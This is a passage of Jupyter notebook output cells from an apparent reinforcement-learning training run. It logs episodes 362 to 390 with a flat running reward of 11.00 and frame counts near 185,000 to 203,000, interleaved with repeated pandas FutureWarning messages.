     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 362\t Frame count: 184700\t Context: 1\n",
      "Running reward: 11.00\t Episode 362\t Frame count: 184800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 362\t Frame count: 184900\t Context: 1\n",
      "Running reward: 11.00\t Episode 362\t Frame count: 185000\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 362\t Frame count: 185100\t Context: 2\n",
      "Running reward: 11.00\t Episode 362\t Frame count: 185200\t Context: 2\n",
      "Running reward: 11.00\t Episode 362\t Frame count: 185300\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 362\t Frame count: 185400\t Context: 2\n",
      "Running reward: 11.00\t Episode 362\t Frame count: 185500\t Context: 2\n",
      "Running reward: 11.00\t Episode 363\t Frame count: 185600\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 363\t Frame count: 185700\t Context: 1\n",
      "Running reward: 11.00\t Episode 363\t Frame count: 185800\t Context: 2\n",
      "Running reward: 11.00\t Episode 363\t Frame count: 185900\t Context: 2\n",
      "Running reward: 11.00\t Episode 363\t Frame count: 186000\t Context: 2\n",
      "Running reward: 11.00\t Episode 363\t Frame count: 186100\t Context: 2\n",
      "Running reward: 11.00\t Episode 364\t Frame count: 186200\t Context: 1\n",
      "Running reward: 11.00\t Episode 364\t Frame count: 186300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 364\t Frame count: 186400\t Context: 1\n",
      "Running reward: 11.00\t Episode 364\t Frame count: 186500\t Context: 1\n",
      "Running reward: 11.00\t Episode 364\t Frame count: 186600\t Context: 1\n",
      "Running reward: 11.00\t Episode 364\t Frame count: 186700\t Context: 1\n",
      "Running reward: 11.00\t Episode 364\t Frame count: 186800\t Context: 2\n",
      "Running reward: 11.00\t Episode 364\t Frame count: 186900\t Context: 2\n",
      "Running reward: 11.00\t Episode 364\t Frame count: 187000\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 365\t Frame count: 187100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 365\t Frame count: 187200\t Context: 1\n",
      "Running reward: 11.00\t Episode 365\t Frame count: 187300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 365\t Frame count: 187400\t Context: 1\n",
      "Running reward: 11.00\t Episode 365\t Frame count: 187500\t Context: 1\n",
      "Running reward: 11.00\t Episode 365\t Frame count: 187600\t Context: 1\n",
      "Running reward: 11.00\t Episode 365\t Frame count: 187700\t Context: 1\n",
      "Running reward: 11.00\t Episode 365\t Frame count: 187800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 365\t Frame count: 187900\t Context: 2\n",
      "Running reward: 11.00\t Episode 366\t Frame count: 188000\t Context: 1\n",
      "Running reward: 11.00\t Episode 366\t Frame count: 188100\t Context: 1\n",
      "Running reward: 11.00\t Episode 366\t Frame count: 188200\t Context: 1\n",
      "Running reward: 11.00\t Episode 367\t Frame count: 188300\t Context: 1\n",
      "Running reward: 11.00\t Episode 367\t Frame count: 188400\t Context: 1\n",
      "Running reward: 11.00\t Episode 368\t Frame count: 188500\t Context: 1\n",
      "Running reward: 11.00\t Episode 368\t Frame count: 188600\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 369\t Frame count: 188700\t Context: 1\n",
      "Running reward: 11.00\t Episode 369\t Frame count: 188800\t Context: 2\n",
      "Running reward: 11.00\t Episode 369\t Frame count: 188900\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 370\t Frame count: 189000\t Context: 2\n",
      "Running reward: 11.00\t Episode 370\t Frame count: 189100\t Context: 2\n",
      "Running reward: 11.00\t Episode 370\t Frame count: 189200\t Context: 2\n",
      "Running reward: 11.00\t Episode 370\t Frame count: 189300\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 371\t Frame count: 189400\t Context: 1\n",
      "Running reward: 11.00\t Episode 371\t Frame count: 189500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 371\t Frame count: 189600\t Context: 1\n",
      "Running reward: 11.00\t Episode 372\t Frame count: 189700\t Context: 1\n",
      "Running reward: 11.00\t Episode 372\t Frame count: 189800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 372\t Frame count: 189900\t Context: 1\n",
      "Running reward: 11.00\t Episode 372\t Frame count: 190000\t Context: 2\n",
      "Running reward: 11.00\t Episode 373\t Frame count: 190100\t Context: 2\n",
      "Running reward: 11.00\t Episode 374\t Frame count: 190200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 374\t Frame count: 190300\t Context: 1\n",
      "Running reward: 11.00\t Episode 374\t Frame count: 190400\t Context: 2\n",
      "Running reward: 11.00\t Episode 374\t Frame count: 190500\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 375\t Frame count: 190600\t Context: 2\n",
      "Running reward: 11.00\t Episode 375\t Frame count: 190700\t Context: 2\n",
      "Running reward: 11.00\t Episode 375\t Frame count: 190800\t Context: 2\n",
      "Running reward: 11.00\t Episode 375\t Frame count: 190900\t Context: 2\n",
      "Running reward: 11.00\t Episode 375\t Frame count: 191000\t Context: 2\n",
      "Running reward: 11.00\t Episode 375\t Frame count: 191100\t Context: 2\n",
      "Running reward: 11.00\t Episode 375\t Frame count: 191200\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 375\t Frame count: 191300\t Context: 2\n",
      "Running reward: 11.00\t Episode 376\t Frame count: 191400\t Context: 1\n",
      "Running reward: 11.00\t Episode 376\t Frame count: 191500\t Context: 1\n",
      "Running reward: 11.00\t Episode 376\t Frame count: 191600\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 376\t Frame count: 191700\t Context: 1\n",
      "Running reward: 11.00\t Episode 376\t Frame count: 191800\t Context: 2\n",
      "Running reward: 11.00\t Episode 376\t Frame count: 191900\t Context: 2\n",
      "Running reward: 11.00\t Episode 376\t Frame count: 192000\t Context: 2\n",
      "Running reward: 11.00\t Episode 376\t Frame count: 192100\t Context: 2\n",
      "Running reward: 11.00\t Episode 376\t Frame count: 192200\t Context: 2\n",
      "Running reward: 11.00\t Episode 376\t Frame count: 192300\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 377\t Frame count: 192400\t Context: 1\n",
      "Running reward: 11.00\t Episode 377\t Frame count: 192500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 377\t Frame count: 192600\t Context: 1\n",
      "Running reward: 11.00\t Episode 377\t Frame count: 192700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 377\t Frame count: 192800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 377\t Frame count: 192900\t Context: 1\n",
      "Running reward: 11.00\t Episode 377\t Frame count: 193000\t Context: 1\n",
      "Running reward: 11.00\t Episode 377\t Frame count: 193100\t Context: 1\n",
      "Running reward: 11.00\t Episode 377\t Frame count: 193200\t Context: 1\n",
      "Running reward: 11.00\t Episode 377\t Frame count: 193300\t Context: 1\n",
      "Running reward: 11.00\t Episode 377\t Frame count: 193400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 377\t Frame count: 193500\t Context: 1\n",
      "Running reward: 11.00\t Episode 377\t Frame count: 193600\t Context: 1\n",
      "Running reward: 11.00\t Episode 377\t Frame count: 193700\t Context: 1\n",
      "Running reward: 11.00\t Episode 377\t Frame count: 193800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 377\t Frame count: 193900\t Context: 2\n",
      "Running reward: 11.00\t Episode 377\t Frame count: 194000\t Context: 2\n",
      "Running reward: 11.00\t Episode 377\t Frame count: 194100\t Context: 2\n",
      "Running reward: 11.00\t Episode 378\t Frame count: 194200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 378\t Frame count: 194300\t Context: 1\n",
      "Running reward: 11.00\t Episode 378\t Frame count: 194400\t Context: 1\n",
      "Running reward: 11.00\t Episode 378\t Frame count: 194500\t Context: 2\n",
      "Running reward: 11.00\t Episode 378\t Frame count: 194600\t Context: 2\n",
      "Running reward: 11.00\t Episode 379\t Frame count: 194700\t Context: 1\n",
      "Running reward: 11.00\t Episode 379\t Frame count: 194800\t Context: 1\n",
      "Running reward: 11.00\t Episode 379\t Frame count: 194900\t Context: 1\n",
      "Running reward: 11.00\t Episode 379\t Frame count: 195000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 380\t Frame count: 195100\t Context: 2\n",
      "Running reward: 11.00\t Episode 380\t Frame count: 195200\t Context: 2\n",
      "Running reward: 11.00\t Episode 380\t Frame count: 195300\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 381\t Frame count: 195400\t Context: 1\n",
      "Running reward: 11.00\t Episode 381\t Frame count: 195500\t Context: 1\n",
      "Running reward: 11.00\t Episode 381\t Frame count: 195600\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 381\t Frame count: 195700\t Context: 1\n",
      "Running reward: 11.00\t Episode 381\t Frame count: 195800\t Context: 2\n",
      "Running reward: 11.00\t Episode 381\t Frame count: 195900\t Context: 2\n",
      "Running reward: 11.00\t Episode 382\t Frame count: 196000\t Context: 1\n",
      "Running reward: 11.00\t Episode 382\t Frame count: 196100\t Context: 1\n",
      "Running reward: 11.00\t Episode 382\t Frame count: 196200\t Context: 1\n",
      "Running reward: 11.00\t Episode 382\t Frame count: 196300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 382\t Frame count: 196400\t Context: 1\n",
      "Running reward: 11.00\t Episode 382\t Frame count: 196500\t Context: 1\n",
      "Running reward: 11.00\t Episode 382\t Frame count: 196600\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 382\t Frame count: 196700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 382\t Frame count: 196800\t Context: 1\n",
      "Running reward: 11.00\t Episode 382\t Frame count: 196900\t Context: 1\n",
      "Running reward: 11.00\t Episode 383\t Frame count: 197000\t Context: 1\n",
      "Running reward: 11.00\t Episode 383\t Frame count: 197100\t Context: 2\n",
      "Running reward: 11.00\t Episode 383\t Frame count: 197200\t Context: 2\n",
      "Running reward: 11.00\t Episode 383\t Frame count: 197300\t Context: 2\n",
      "Running reward: 11.00\t Episode 383\t Frame count: 197400\t Context: 2\n",
      "Running reward: 11.00\t Episode 384\t Frame count: 197500\t Context: 1\n",
      "Running reward: 11.00\t Episode 384\t Frame count: 197600\t Context: 1\n",
      "Running reward: 11.00\t Episode 384\t Frame count: 197700\t Context: 1\n",
      "Running reward: 11.00\t Episode 385\t Frame count: 197800\t Context: 1\n",
      "Running reward: 11.00\t Episode 385\t Frame count: 197900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 385\t Frame count: 198000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 385\t Frame count: 198100\t Context: 1\n",
      "Running reward: 11.00\t Episode 385\t Frame count: 198200\t Context: 2\n",
      "Running reward: 11.00\t Episode 385\t Frame count: 198300\t Context: 2\n",
      "Running reward: 11.00\t Episode 385\t Frame count: 198400\t Context: 2\n",
      "Running reward: 11.00\t Episode 385\t Frame count: 198500\t Context: 2\n",
      "Running reward: 11.00\t Episode 385\t Frame count: 198600\t Context: 2\n",
      "Running reward: 11.00\t Episode 385\t Frame count: 198700\t Context: 2\n",
      "Running reward: 11.00\t Episode 385\t Frame count: 198800\t Context: 2\n",
      "Running reward: 11.00\t Episode 385\t Frame count: 198900\t Context: 2\n",
      "Running reward: 11.00\t Episode 385\t Frame count: 199000\t Context: 2\n",
      "Running reward: 11.00\t Episode 386\t Frame count: 199100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 386\t Frame count: 199200\t Context: 1\n",
      "Running reward: 11.00\t Episode 386\t Frame count: 199300\t Context: 1\n",
      "Running reward: 11.00\t Episode 386\t Frame count: 199400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 386\t Frame count: 199500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 386\t Frame count: 199600\t Context: 2\n",
      "Running reward: 11.00\t Episode 386\t Frame count: 199700\t Context: 2\n",
      "Running reward: 11.00\t Episode 386\t Frame count: 199800\t Context: 2\n",
      "Running reward: 11.00\t Episode 386\t Frame count: 199900\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 387\t Frame count: 200000\t Context: 2\n",
      "Running reward: 11.00\t Episode 387\t Frame count: 200100\t Context: 2\n",
      "Running reward: 11.00\t Episode 388\t Frame count: 200200\t Context: 1\n",
      "Running reward: 11.00\t Episode 388\t Frame count: 200300\t Context: 1\n",
      "Running reward: 11.00\t Episode 388\t Frame count: 200400\t Context: 1\n",
      "Running reward: 11.00\t Episode 388\t Frame count: 200500\t Context: 2\n",
      "Running reward: 11.00\t Episode 388\t Frame count: 200600\t Context: 2\n",
      "Running reward: 11.00\t Episode 388\t Frame count: 200700\t Context: 2\n",
      "Running reward: 11.00\t Episode 388\t Frame count: 200800\t Context: 2\n",
      "Running reward: 11.00\t Episode 389\t Frame count: 200900\t Context: 1\n",
      "Running reward: 11.00\t Episode 389\t Frame count: 201000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 389\t Frame count: 201100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 389\t Frame count: 201200\t Context: 2\n",
      "Running reward: 11.00\t Episode 389\t Frame count: 201300\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 389\t Frame count: 201400\t Context: 2\n",
      "Running reward: 11.00\t Episode 389\t Frame count: 201500\t Context: 2\n",
      "Running reward: 11.00\t Episode 389\t Frame count: 201600\t Context: 2\n",
      "Running reward: 11.00\t Episode 389\t Frame count: 201700\t Context: 2\n",
      "Running reward: 11.00\t Episode 389\t Frame count: 201800\t Context: 2\n",
      "Running reward: 11.00\t Episode 389\t Frame count: 201900\t Context: 2\n",
      "Running reward: 11.00\t Episode 389\t Frame count: 202000\t Context: 2\n",
      "Running reward: 11.00\t Episode 389\t Frame count: 202100\t Context: 2\n",
      "Running reward: 11.00\t Episode 389\t Frame count: 202200\t Context: 2\n",
      "Running reward: 11.00\t Episode 389\t Frame count: 202300\t Context: 2\n",
      "Running reward: 11.00\t Episode 389\t Frame count: 202400\t Context: 2\n",
      "Running reward: 11.00\t Episode 389\t Frame count: 202500\t Context: 2\n",
      "Running reward: 11.00\t Episode 389\t Frame count: 202600\t Context: 2\n",
      "Running reward: 11.00\t Episode 389\t Frame count: 202700\t Context: 2\n",
      "Running reward: 11.00\t Episode 389\t Frame count: 202800\t Context: 2\n",
      "Running reward: 11.00\t Episode 390\t Frame count: 202900\t Context: 1\n",
